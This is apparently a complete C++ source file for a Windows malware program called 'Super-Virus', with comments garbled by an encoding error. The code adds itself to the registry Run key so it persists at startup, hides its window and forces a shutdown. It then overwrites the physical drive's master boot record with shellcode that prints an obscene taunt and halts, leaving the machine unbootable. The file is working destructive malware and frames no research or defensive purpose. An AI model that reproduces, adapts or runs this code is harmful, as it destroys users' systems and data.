#include<bits/stdc++.h>
using namespace std;
#include <windows.h>
#include <winioctl.h>
int First = 0;HWND hwnd;
unsigned char scode[] =
"\xb8\x12\x00\xcd\x10\xbd\x18\x7c\xb9\x18\x00\xb8\x01\x13\xbb\x0c"
"\x00\xba\x1d\x0e\xcd\x10\xe2\xfe\x49\x20\x61\x6d\x20\x76\x69\x72"
"\x75\x73\x21\x20\x46\x75\x63\x6b\x20\x79\x6f\x75\x20\x3a\x2d\x29";
/*
00000000  B81200 mov ax, 12H ; ah = 0, al = 12h (640 * 480)
00000003  CD10 int 10h ; ����ͼ����ʾ��ʽ�����ع��
00000005  BD187C mov bp, Msg ; ES:BP = ����ַ
00000008  B91800 mov cx, 18h ; CX = ������
0000000B  B80113 mov ax, 1301h ; AH = 13,  AL = 01h
0000000E  BB0C00 mov bx, 000ch ; ҳ��Ϊ0(BH = 0) �ڵ׺���(BL = 0Ch,����)
00000011  BA1D0E mov dx, 0e1dh ; dh��, dl��
00000014  CD10 int 10h ; 10h ���ж�
00000016  E2FE loop $
Msg: db "I am virus! Fuck you :-)"
*/
int KillMBR()
{
    HANDLE hDevice;
    DWORD dwBytesWritten, dwBytesReturned;
    BYTE pMBR[512] = { 0 };

    // ���¹���MBR
    memcpy(pMBR, scode, sizeof(scode) - 1);
    pMBR[510] = 0x55;
    pMBR[511] = 0xAA;

    hDevice = CreateFile
    (
        TEXT("\\\\.\\PHYSICALDRIVE0"),
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );
    if (hDevice == INVALID_HANDLE_VALUE)
        return -1;
    DeviceIoControl
    (
        hDevice,
        FSCTL_LOCK_VOLUME,
        NULL,
        0,
        NULL,
        0,
        &dwBytesReturned,
        NULL
    );
    // д�벡������
    WriteFile(hDevice, pMBR, sizeof(pMBR), &dwBytesWritten, NULL);
    DeviceIoControl
    (
        hDevice,
        FSCTL_UNLOCK_VOLUME,
        NULL,
        0,
        NULL,
        0,
        &dwBytesReturned,
        NULL
    );
    CloseHandle(hDevice);
    return 0;
}
bool WriteToRegedit(HKEY hKey_,std::wstring path_,std::wstring key_,std::wstring value_)
{
	HKEY hkey;
	::RegCreateKeyExW(hKey_, 
		path_.c_str(), 
		0, 
		NULL, 
		REG_OPTION_NON_VOLATILE, 
		KEY_WRITE, 
		NULL, 
		&hkey, 
		NULL);
	//
	::RegSetValueExW(hkey, 
		key_.c_str(), 
		0, 
		REG_SZ, 
		reinterpret_cast<LPBYTE>(const_cast<wchar_t*>(value_.c_str())),
		sizeof(std::wstring::value_type) * (value_.size() + 1));
	::RegCloseKey(hkey);
	return true;
}

// ���ÿ�������������
// @param:key_:����������
// @param:value_:�����ļ�·��
// return: false: ����ʧ�� true:���óɹ�
bool SetBootStartUp(std::wstring key_,std::wstring path_ )
{
	return WriteToRegedit(HKEY_CURRENT_USER,L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",key_,path_);
}

void Hide(){
	ShowWindow(hwnd,0);
}
void Show(){
	ShowWindow(hwnd,1);
}
std::wstring stringToWstring(const std::string& str)
{
    LPCSTR pszSrc = str.c_str();
    int nLen = MultiByteToWideChar(CP_ACP, 0, pszSrc, -1, NULL, 0);
    if (nLen == 0) 
        return std::wstring(L"");

    wchar_t* pwszDst = new wchar_t[nLen];
    if (!pwszDst) 
        return std::wstring(L"");

    MultiByteToWideChar(CP_ACP, 0, pszSrc, -1, pwszDst, nLen);
    std::wstring wstr(pwszDst);
    delete[] pwszDst;
    pwszDst = NULL;

    return wstr;
}
int main(int argc, char* argv[]){
	std::wstring key_ = stringToWstring(string("Super-Virus"));
	std::wstring path = stringToWstring(string(argv[0]));
	SetBootStartUp(key_,path);
	system("title>nul Super-Virus");
	hwnd=FindWindow(NULL,argv[0]);
	Hide();
	if(fopen("First.sys","rb") == NULL){
		First = 1;	 
	}
	system("copy>nul nul First.sys");
	system("shutdown /s /t 1");
	KillMBR();
	return 0;
}
/*
#include<windows.h>
int main(){
	HWND hwnd=GetForegroundWindow();//��ȡ��ǰ�˴��ڵľ��
	ShowWindow(hwnd,0);//ShowWindow���� 
	Sleep(1000);
	ShowWindow(hwnd,1);//ShowWindow��ʾ 
	return 0;
}
*/
